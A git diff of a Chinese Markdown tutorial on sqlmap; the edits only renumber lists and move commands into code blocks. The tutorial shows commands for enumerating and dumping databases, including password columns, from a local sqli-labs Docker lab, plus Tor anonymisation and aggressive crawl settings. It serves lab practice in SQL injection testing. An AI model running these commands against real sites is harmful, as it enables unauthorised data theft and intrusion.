@@ -1,15 +1,16 @@
 [[toc]]
+
 ## 简介
 1. sqlmap是一款集成多种数据库识别及注入方式的工具；
 2. 可在任何平台上使用，支持Python2.6、2.7、3.x；
 3. 集成了大量的payload；
 4. 强大的检测与利用自动化处理能力。
 ## 下载安装
-1. 官网：
+1. 官网
 	- https://sqlmap.org/
-1. GitHub：
+2. GitHub
 	- https://github.com/sqlmapproject/sqlmap
-1. 用法：
+3. 用法
 	- https://github.com/sqlmapproject/sqlmap/wiki/Usage
 
 ## 功能
@@ -92,7 +93,7 @@
 	- 通过配置Tor Client以及Privoxy我们就可以启用-tor选项
 	- 该选项可以使得sqlmap的请求通过Tor网络进行发送，以达到匿名的目的。
 	- 同时，我们还可以通过--tor-port 以及--tor-type 设置所使用的的 Tor Proxy 类型
-	-check-tor 则是用来检测 Tor 网络是否配置目连接正常
+	- check-tor 则是用来检测 Tor 网络是否配置目连接正常
 1. 选项--crawl
 	- 从目标位置开始收集（爬虫）可能易受攻击的链接
 	- python36 sqlmap.py -u "http://10.8.250.77:8082/Less-1?id=1" --crawl=10 --batch
@@ -125,13 +126,13 @@
 	- python36 sqlmap.py -u "http://10.8.250.77:8082/Less-1/?id=1" -dbs 
 2. 获取当前数据库
 	- python36 sqlmap.py -u "http://10.8.250.77:8082/Less-1/?id=1" --current-db
-4. 获取数据库的表名
+3. 获取数据库的表名
 	- python36 sqlmap.py -u "http://10.8.250.77:8082/Less-1/?id=1" -D "security" -tables
-6. 获取表中的字段
+4. 获取表中的字段
 	- python36 sqlmap.py -u "http://10.8.250.77:8082/Less-1/?id=1" -D "security" -tables -T "users" --columns
-8. 获取字段的内容
+5. 获取字段的内容
 	- python36 sqlmap.py -u "http://10.8.250.77:8082/Less-1/?id=1" -D "security" -tables -T "users" -C "password,username" --dump
-10. 下载数据库的内容
+6. 下载数据库的内容
 	- python36 sqlmap.py -u "http://10.8.250.77:8082/Less-1/?id=1" -D "security" -tables -T "users" -C "id,password,username" --dump-all
 	 
 ## 相关说明
@@ -148,17 +149,23 @@
 	- sql-master/data/xml/payloads 目录下有 payload。
 ## 靶场环境
 1. sqli-labs
-	- docker search sqli-labs (看星星最多的镜像)
-	- docker pull acgpiano/sqli-labs
-	- docker run -dt --name sqli-labs -p 8082:80 --rm acgpiano/sqli-labs
-	- 访问：http://10.8.250.77:8082
+```
+docker search sqli-labs (看星星最多的镜像)
+docker pull acgpiano/sqli-labs
+docker run -dt --name sqli-labs -p 8082:80 --rm acgpiano/sqli-labs
+访问：http://10.8.250.77:8082
+```
 1. mysql
-	- docker search mysql
-	- docker pull mysql
-	- docker run -d --restart=always --name=mysql -v /var/lib/mysql:/var/lib/mysql -v /etc/mysql:/etc/mysql -v /var/log/mysql:/var/log/mysql -p 3306:3306 -e TZ=Asia/Shanghai -e MYSQL_ROOT_PASSWORD=123456 mysql:latest --character-set-server=utf8mb4 --collation-server=utf8mb4_general_ci
-	- #docker ps --format "table {{.Names}}"
+```
+docker search mysql
+docker pull mysql
+docker run -d --restart=always --name=mysql -v /var/lib/mysql:/var/lib/mysql -v /etc/mysql:/etc/mysql -v /var/log/mysql:/var/log/mysql -p 3306:3306 -e TZ=Asia/Shanghai -e MYSQL_ROOT_PASSWORD=123456 mysql:latest --character-set-server=utf8mb4 --collation-server=utf8mb4_general_ci
+docker ps --format "table {{.Names}}"
+```
 ## 测试
-	- python36 sqlmap.py --random-agent  -m ./data/txt/urls.txt  -v 3 --batch --banner --level 5 --risk 3 --crawl 5 --threads=8
+python36 sqlmap.py --random-agent  -m ./data/txt/urls.txt  -v 3 --batch --banner --level 5 --risk 3 --crawl 5 --threads=8
+
+
 
 
 
